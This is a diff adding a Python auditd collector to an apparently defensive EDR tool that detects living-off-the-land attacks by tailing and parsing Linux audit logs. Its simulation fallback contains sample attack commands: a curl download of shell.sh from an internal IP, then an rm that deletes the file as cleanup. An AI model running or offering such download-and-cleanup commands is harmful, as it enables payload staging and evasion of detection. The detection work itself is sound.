@@ -1,0 +1,282 @@
+import os
+import re
+import time
+import pwd
+import threading
+from typing import Dict, Any, List
+from lotl_edr.collector.base import BaseCollector
+from lotl_edr.utils.logger import setup_logger
+
+logger = setup_logger("collector.auditd")
+
+class AuditdCollector(BaseCollector):
+    def __init__(self, config: Dict[str, Any], callback=None):
+        super().__init__("auditd", config, callback)
+        self.log_path = config.get("log_path", "/var/log/audit/audit.log")
+        self.thread = None
+        self.pending_events = {}
+        self.pending_lock = threading.Lock()
+        self.header_pattern = re.compile(r"msg=audit\((\d+\.\d+):(\d+)\):")
+
+    def start(self) -> None:
+        self.running = True
+        self.thread = threading.Thread(target=self._tail_log, daemon=True)
+        self.thread.start()
+        logger.info(f"Auditd collector started. Tailing: {self.log_path}")
+
+    def stop(self) -> None:
+        self.running = False
+        if self.thread:
+            self.thread.join(timeout=1.0)
+        logger.info("Auditd collector stopped.")
+
+    def _tail_log(self) -> None:
+        if not os.path.exists(self.log_path):
+            logger.warning(f"Log path {self.log_path} not found. Running in simulation fallback mode.")
+            self._run_simulation_loop()
+            return
+
+        try:
+            file_handle = open(self.log_path, "r", encoding="utf-8", errors="ignore")
+            file_handle.seek(0, os.SEEK_END)
+            inode = os.stat(self.log_path).st_ino
+        except Exception as e:
+            logger.error(f"Failed to open audit log {self.log_path}: {e}")
+            return
+
+        cleaner = threading.Thread(target=self._flush_expired_events_loop, daemon=True)
+        cleaner.start()
+
+        while self.running:
+            try:
+                line = file_handle.readline()
+                if not line:
+                    time.sleep(0.1)
+                    if os.path.exists(self.log_path):
+                        curr_stat = os.stat(self.log_path)
+                        if curr_stat.st_ino != inode or curr_stat.st_size < file_handle.tell():
+                            logger.info("Auditd log rotation detected. Re-opening.")
+                            file_handle.close()
+                            file_handle = open(self.log_path, "r", encoding="utf-8", errors="ignore")
+                            inode = curr_stat.st_ino
+                    continue
+
+                self.parse_line(line.strip())
+
+            except Exception as e:
+                logger.error(f"Error reading audit log: {e}")
+                time.sleep(1)
+
+        file_handle.close()
+
+    def parse_line(self, line: str) -> None:
+        # REVERTED: an earlier "optimization" here rejected any line
+        # without "lotl_"/"key=" before parsing -- but EXECVE/PATH/CWD/
+        # PROCTITLE lines never carry key= themselves (only the final
+        # SYSCALL line does), so that filter silently dropped command
+        # arguments for every event, breaking full cmdline capture.
+        # Correctness restored; volume is instead addressed by trimming
+        # CIS's own broad non-lotl audit rules (see below), not by
+        # skipping lines here.
+        type_match = re.search(r"type=(\S+)", line)
+        if not type_match:
+            return
+        rectype = type_match.group(1)
+
+        header_match = self.header_pattern.search(line)
+        if not header_match:
+            return
+        timestamp_sec, event_id = header_match.groups()
+        full_id = f"{timestamp_sec}:{event_id}"
+
+        kv_pairs = self._parse_kvs(line)
+
+        with self.pending_lock:
+            if full_id not in self.pending_events:
+                self.pending_events[full_id] = {
+                    "id": full_id,
+                    "timestamp": float(timestamp_sec),
+                    "types": set(),
+                    "data": {},
+                    "exec_args": {},
+                    "last_seen": time.time()
+                }
+
+            ev = self.pending_events[full_id]
+            ev["types"].add(rectype)
+            ev["last_seen"] = time.time()
+
+            if rectype == "SYSCALL":
+                ev["data"].update(kv_pairs)
+            elif rectype == "EXECVE":
+                for k, v in kv_pairs.items():
+                    if k.startswith("a") and k[1:].isdigit():
+                        arg_index = int(k[1:])
+                        decoded_val = self._decode_audit_value(v)
+                        ev["exec_args"][arg_index] = decoded_val
+            elif rectype in ["PATH", "CWD"]:
+                if rectype not in ev["data"]:
+                    ev["data"][rectype] = []
+                ev["data"][rectype].append(kv_pairs)
+
+            if self._is_event_complete(ev):
+                self._flush_event(full_id)
+
+    def _is_event_complete(self, ev: Dict[str, Any]) -> bool:
+        types = ev["types"]
+        if "SYSCALL" in types:
+            syscall_num = int(ev["data"].get("syscall", -1))
+            is_exec = syscall_num in [59, 322]
+            if is_exec:
+                argc = int(ev["data"].get("argc", 0))
+                if argc > 0 and len(ev["exec_args"]) >= argc:
+                    return True
+                elif argc == 0:
+                    return True
+                return False
+            else:
+                return True
+        return False
+
+    def _parse_kvs(self, line: str) -> Dict[str, str]:
+        kv_pairs = {}
+        pattern = re.compile(r'(\w+)=(?:"([^"]*)"|(\S+))')
+        for match in pattern.finditer(line):
+            key = match.group(1)
+            val = match.group(2) if match.group(2) is not None else match.group(3)
+            kv_pairs[key] = val
+        return kv_pairs
+
+    def _decode_audit_value(self, val: str) -> str:
+        if not val:
+            return ""
+        if len(val) % 2 == 0 and all(c in "0123456789abcdefABCDEF" for c in val):
+            try:
+                decoded = bytes.fromhex(val).decode("utf-8", errors="ignore")
+                if all(32 <= ord(c) < 127 or c in "\r\n\t" for c in decoded):
+                    return decoded
+            except Exception:
+                pass
+        return val
+
+    def _resolve_username(self, uid_str) -> str:
+        """
+        FIX: original code synthesized a placeholder like "user_1001"
+        instead of resolving the real account name from the UID. This
+        meant any containment action triggered by an auditd-sourced
+        event (lock account, etc.) would silently target a nonexistent
+        user and have zero real effect, with no error surfaced anywhere.
+        """
+        try:
+            uid_int = int(uid_str)
+            return pwd.getpwuid(uid_int).pw_name
+        except (ValueError, TypeError, KeyError):
+            return f"uid_{uid_str}" if uid_str is not None else "unknown"
+
+    def _flush_event(self, event_id: str) -> None:
+        ev = self.pending_events.pop(event_id, None)
+        if not ev:
+            return
+
+        data = ev["data"]
+        exec_args = ev["exec_args"]
+
+        cmdline = ""
+        if exec_args:
+            sorted_args = [exec_args[i] for i in sorted(exec_args.keys())]
+            cmdline = " ".join(sorted_args)
+        else:
+            cmdline = data.get("comm", "")
+
+        syscall_num = int(data.get("syscall", -1))
+
+        event_type = "unknown"
+        if syscall_num in [59, 322]:
+            event_type = "process_exec"
+        elif syscall_num in [2, 85, 257]:
+            event_type = "file_modify"
+        elif syscall_num in [87, 263]:
+            event_type = "file_delete"
+        elif syscall_num in [42]:
+            event_type = "network_connect"
+
+        ts_float = ev["timestamp"]
+        ts_str = time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(ts_float)) + f".{int((ts_float % 1) * 1000):03d}Z"
+
+        raw_event = {
+            "audit_id": event_id,
+            "timestamp": ts_str,
+            "event_type": event_type,
+            "pid": int(data.get("pid", -1)),
+            "ppid": int(data.get("ppid", -1)),
+            "uid": int(data.get("uid", -1)),
+            "gid": int(data.get("gid", -1)),
+            "username": self._resolve_username(data.get("uid")),
+            "exe": data.get("exe", ""),
+            "cmdline": cmdline,
+            "tty": data.get("tty"),
+            "session_id": int(data.get("ses")) if data.get("ses") and data.get("ses") != "unset" else None,
+            "syscall_number": syscall_num,
+            "exit_code": int(data.get("exit", 0)) if data.get("exit") else 0,
+            "key": data.get("key"),
+            "raw_audit_data": data
+        }
+
+        # FIX: only emit events tagged with a lotl_* audit key. Without
+        # this filter, every audited syscall on the system (which can be
+        # broad on a CIS-hardened host) gets treated as telemetry, causing
+        # background noise to accumulate false risk/confidence on chains
+        # that have nothing to do with an actual attack.
+        key = data.get("key") or ""
+        if key.startswith("lotl_"):
+            self.emit(raw_event)
+
+    def _flush_expired_events_loop(self) -> None:
+        while self.running:
+            time.sleep(1)
+            now = time.time()
+            expired_ids = []
+            with self.pending_lock:
+                for eid, ev in self.pending_events.items():
+                    if now - ev["last_seen"] > 8.0:
+                        expired_ids.append(eid)
+
+                for eid in expired_ids:
+                    logger.debug(f"Flushing expired audit event {eid}")
+                    self._flush_event(eid)
+
+    def _run_simulation_loop(self) -> None:
+        sim_events = [
+            {
+                "audit_id": "1625893121.123:456",
+                "timestamp": self._get_iso_timestamp(),
+                "event_type": "process_exec",
+                "pid": 6001, "ppid": 1200, "uid": 1000, "gid": 1000,
+                "username": "developer", "exe": "/usr/bin/curl",
+                "cmdline": "curl -s http://10.0.0.5:8000/shell.sh -o /tmp/shell.sh",
+                "tty": "pts/2", "session_id": 4, "syscall_number": 59,
+                "exit_code": 0, "key": "susp_download"
+            },
+            {
+                "audit_id": "1625893122.456:457",
+                "timestamp": self._get_iso_timestamp(),
+                "event_type": "file_delete",
+                "pid": 6001, "ppid": 1200, "uid": 1000, "gid": 1000,
+                "username": "developer", "exe": "/usr/bin/rm",
+                "cmdline": "rm -f /tmp/shell.sh",
+                "tty": "pts/2", "session_id": 4, "syscall_number": 87,
+                "exit_code": 0, "key": "cleanup"
+            }
+        ]
+
+        for ev in sim_events:
+            if not self.running:
+                break
+            time.sleep(1)
+            self.emit(ev)
+
+        while self.running:
+            time.sleep(1)
+
+    def _get_iso_timestamp(self) -> str:
+        return time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
